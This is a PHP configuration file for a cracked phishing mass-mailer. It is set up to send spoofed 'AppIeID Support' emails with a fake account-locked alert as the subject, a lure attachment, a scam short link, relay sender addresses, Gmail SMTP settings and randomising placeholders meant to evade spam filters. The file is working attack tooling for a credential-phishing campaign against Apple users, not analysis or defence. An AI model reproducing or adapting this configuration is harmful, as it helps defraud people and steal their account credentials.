<?php

/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
Cracked By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
Contact Me : g33k@israelmail.com
*/

$random = rand(999999,9999999);
require "function/user.php";

//-------------Random (Letter)-----------------//
// [short]          = Your scam link
// [randstring+]    = Uppercase random string
// [randstring-]    = Lowercase random string
// [randstring=]    = Mixcase random string
// [country]        = Random country
// [date]           = Random date
// [OS]             = Random OS
// [browser]        = Random Browser
// [number]         = Random Number
// [ip]             = Random IP
//------------Random (From Mail)---------------//
// [randstring+]    = Uppercase random string
// [randstring-]    = Lowercase random string
// [randstring=]    = Mixcase random string
// [number]         = Random Number
// [default]        = Random 16 Digit String
//----------------Config---------------------//

$usesmtpgen         = "0"; //   0 [manual create user_relay], 1 [use generated user relay]
$usehtml            = "1"; //   0 [null letter], 1 [html letter], 2 [plain letter]
$mode               = "bcc"; //  bcc [BCC], cc [CC]
$token              = "[!]DNThirTeen@L34kC0de"; //    Only for 1 month
$h34rtbl33d         = '$2a$15$Nx9YJ1VX6rwjqXhLpwZnMOqjx4zlEc/ibhxViRetTojHmHC9uU6jK';
$from_mail          = "[randstring+]-[randstring-][randstring=].[number]";

$bstrd              = [ "host"  => "smtp.gmail.com",
                        "port"  => "587",
                        "pass"  => "11111111",
                      ];

$user_relay         = [
"noreply.mailservicestore18971@i-forgotappsaccount.business",
"noreply.mailservicestore18972@i-forgotappsaccount.business",
"noreply.mailservicestore18973@i-forgotappsaccount.business",
"noreply.mailservicestore18974@i-forgotappsaccount.business",
"noreply.mailservicestore18975@i-forgotappsaccount.business",
"noreply.mailservicestore18976@i-forgotappsaccount.business",
"noreply.mailservicestore18977@i-forgotappsaccount.business",
"noreply.mailservicestore18978@i-forgotappsaccount.business",
"noreply.mailservicestore18979@i-forgotappsaccount.business",

                      ];

$mails              = [

                        "subj"      => "RE: [New Statement Alert] Reminder: Your account acknowledgement locked - new logon in your account on [date] [randstring+][FWD] El acuse de recibo de su cuenta, nuevo inicio de sesión en su cuenta[randstring+] ",
                        "attached"  => "attach/Locked_Account.pdf",
                        "bcc"       => "cs@apple.com",
                        "fromname"  => "AppIeID ‍Support ",
                        "letter"    => "letter/let.txt",
                        "plain"     => "Open or download the attached file for the details for your information !!",
                        "file_name" => "Case-ID#".$random.".dot",
                        "list"      => "list/mailist.txt",
                        "short"     => "http://ic.srv.br/fd99f134ce",
                     ];
?>